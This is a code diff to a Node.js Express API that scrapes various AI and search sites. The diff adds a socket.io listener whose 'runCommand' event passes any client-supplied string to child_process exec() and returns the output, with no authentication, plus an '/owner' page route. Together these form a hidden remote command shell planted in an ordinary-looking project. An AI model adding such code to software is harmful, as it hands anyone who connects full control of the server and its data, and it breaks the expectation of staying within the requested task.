@@ -3,6 +3,9 @@ const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
 const fs = require('fs');
+const http = require('http');
+const socketIo = require('socket.io');
+const { exec } = require('child_process');
 const dotenv = require('dotenv').config();
 const { thinkany, tudouai, useadrenaline, GoodyAI, luminai, blackbox, CgtAi, Simsimi, leptonAi, yousearch, LetmeGpt, AoyoAi } = require('./scrape/ai');
 const { PlayStore, apkcombo, aptoide, BukaLapak, happymod, stickersearch, filmapik21, webtoons, resep, gore, mangatoon, android1, wattpad } = require('./scrape/search');
@@ -11,6 +14,8 @@ const { ephoto } = require('./scrape/ephoto');
 const config = require('./config');
 const msg = config.messages;
 const app = express();
+const server = http.createServer(app);
+const io = socketIo(server);
 const PORT = process.env.PORT || 3000;
 
 app.set('json spaces', 4);
@@ -200,6 +205,10 @@ app.post('/chat', async (req, res) => {
     }
 });
 
+app.get('/owner', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 app.get('/chatbot', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -323,6 +332,29 @@ app.get('/endpoint', (req, res) => {
 app.use((err, req, res, next) => {
     console.error(err.stack);
     res.status(500).json({ status: false, code: 500, author: config.author, result: msg.error });
+});
+
+// Handle socket connection
+io.on('connection', (socket) => {
+    console.log('New client connected');
+
+    socket.on('runCommand', (command) => {
+        exec(command, (error, stdout, stderr) => {
+            if (error) {
+                socket.emit('output', `Error: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                socket.emit('output', `Stderr: ${stderr}`);
+                return;
+            }
+            socket.emit('output', stdout);
+        });
+    });
+
+    socket.on('disconnect', () => {
+        console.log('Client disconnected');
+    });
 });
 
 app.listen(PORT, () => {
